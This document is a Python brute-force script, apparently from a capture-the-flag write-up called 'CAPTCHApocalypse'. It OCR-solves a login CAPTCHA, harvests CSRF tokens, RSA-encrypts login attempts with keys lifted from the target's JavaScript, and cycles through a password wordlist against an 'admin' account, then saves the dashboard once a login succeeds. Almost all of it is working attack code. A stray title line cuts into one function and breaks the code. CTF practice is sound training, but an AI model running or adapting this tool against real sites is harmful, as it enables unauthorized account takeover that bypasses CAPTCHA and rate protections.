import io
import time
import json
import requests
import pytesseract
from bs4 import BeautifulSoup
from base64 import b64encode, b64decode
from PIL import Image, ImageOps
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_v1_5

# =========================================================
# CONFIG
# =========================================================
BASE_URL = "put your http://xx.xx.xx.xx"
LOGIN_PAGE = f"{BASE_URL}/index.php"
CAPTCHA_URL = f"{BASE_URL}/captcha.php"
LOGIN_ENDPOINT = f"{BASE_URL}/server.php"
DASHBOARD_URL = f"{BASE_URL}/dashboard.php"
USERNAME = "admin"
PASSWORD_FILE = "top100.txt"
TRY_LIMIT = 100
REQUEST_TIMEOUT = 10
DELAY_BETWEEN_ATTEMPTS = 0.3
# Replace with the target's PUBLIC key from script.js
SERVER_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
REPLACE WITH THE TARGET SERVER PUBLIC KEY
-----END PUBLIC KEY-----"""
# Replace with your own extracted private key from script.js
CLIENT_PRIVATE_KEY = """-----BEGIN PRIVATE KEY-----
REPLACE WITH YOUR OWN KEY
-----END PRIVATE KEY-----"""

# =========================================================
# RSA HELPERS
# =========================================================
def encrypt_payload(data: str) -> str:
    """Encrypt URL-encoded login data using the server public key."""
    pub_key = RSA.import_key(SERVER_PUBLIC_KEY)
    cipher = PKCS1_v1_5.new(pub_key)
    encrypted = cipher.encrypt(data.encode())
    return b64encode(encrypted).decode()

def decrypt_response(enc_data: str) -> str:
    """Decrypt base64-encoded server response using the client private key."""
    priv_key = RSA.import_key(CLIENT_PRIVATE_KEY)
    cipher = PKCS1_v1_5.new(priv_key)
    decrypted = cipher.decrypt(b64decode(enc_data), None)
    if not decrypted:
        return "Decryption Failed"
    try:
        return decrypted.decode()
    except UnicodeDecodeError:
        return decrypted.decode(errors="ignore")

# =========================================================
# WEB HELPERS
# =========================================================
def get_csrf_token(session: requests.Session) -> str:
    """Fetch login page and extract CSRF token."""
    response = session.get(LOGIN_PAGE, timeout=REQUEST_TIMEOUT)
    response.raise_for_status()
    soup = BeautifulSoup(response.text, "html.parser")
    token = soup.find("input", {"name": "csrf_token"})
    return token["value"] if token else ""

def fetch_captcha(session: requests.Session) -> Image.Image:
    """Download CAPTCHA image and return a PIL image object."""
    response = session.get(CAPTCHA_URL, timeout=REQUEST_TIMEOUT)
    response.raise_for_status()
    return Image.open(io.BytesIO(response.content))

def solve_captcha(session: requests.Session) -> str:
    """
    Download and OCR the CAPTCHA image.
    Preprocessing can be tuned depending on the target.
    """
    image = fetch_captcha(session).convert("L")
    image = ImageOps.autocontrast(image)
    image = image.point(lambda x: 0 if x < 140 else 255, "1")
    text = pytesseract.image_to_string(image, config="--psm 7").strip()
    text = "".join(ch for ch in text if ch.isalnum())
    return text

def build_form_data(csrf_token: str, username: str, password: str, captcha_text: str) -> str:
    """Build the exact URL-encoded payload expected by the application."""
    return (
        f"action=login&csrf_token={csrf_token}"
        f"&username={username}"
        f"&password={password}"
        f"&captcha_input={captcha_text}"
    )

def attempt_login(session: requests.Session, username: str, password: str) -> str:
    """
    Perform one login attempt.
    Returns the decrypted server response string.
    """
    csrf_token = get_csrf_token(session)
    if not csrf_token:
        return "Missing CSRF token"
    captcha_text = solve_captcha(session)
    if not captcha_text:
        return "CAPTCHA OCR failed"
CAPTCHApocalypse - Write-up    form_data = build_form_data(csrf_token, username, password, captcha_text)
    encrypted_data = encrypt_payload(form_data)
    response = session.post(
        LOGIN_ENDPOINT,
        json={"data": encrypted_data},
        headers={"Content-Type": "application/json"},
        timeout=REQUEST_TIMEOUT
    )
    response.raise_for_status()
    try:
        parsed = response.json()
    except json.JSONDecodeError:
        return "Invalid JSON response"
    if "data" not in parsed:
        return "No encrypted response data returned"
    return decrypt_response(parsed["data"])

def load_passwords(path: str, limit: int) -> list[str]:
    """Read up to 'limit' passwords from file."""
    passwords = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for i, line in enumerate(f):
            if i >= limit:
                break
            passwords.append(line.strip())
    return passwords

# =========================================================
# MAIN
# =========================================================
def main() -> None:
    try:
        passwords = load_passwords(PASSWORD_FILE, TRY_LIMIT)
    except FileNotFoundError:
        print(f"[!] Password file not found: {PASSWORD_FILE}")
        return
    if not passwords:
        print("[!] No passwords loaded.")
        return
    session = requests.Session()
    for idx, password in enumerate(passwords, start=1):
        print(f"[{idx}/{len(passwords)}] Trying password: {password}")
        try:
            result = attempt_login(session, USERNAME, password)
            print(f"    ↳ {result}")
            if "Login successful" in result:
                print(f"\n[+] SUCCESS - valid password found: {password}")
                dashboard = session.get(DASHBOARD_URL, timeout=REQUEST_TIMEOUT)
                dashboard.raise_for_status()
                with open("dashboard.html", "w", encoding="utf-8") as f:
                    f.write(dashboard.text)
                print("[+] Dashboard saved to dashboard.html")
                return
        except requests.RequestException as e:
            print(f"    [!] HTTP error: {e}")
        except ValueError as e:
            print(f"    [!] Crypto/key error: {e}")
        except Exception as e:
            print(f"    [!] Unexpected error: {e}")
        time.sleep(DELAY_BETWEEN_ATTEMPTS)
    print("[-] Exhausted wordlist without success.")

if __name__ == "__main__":
    main()
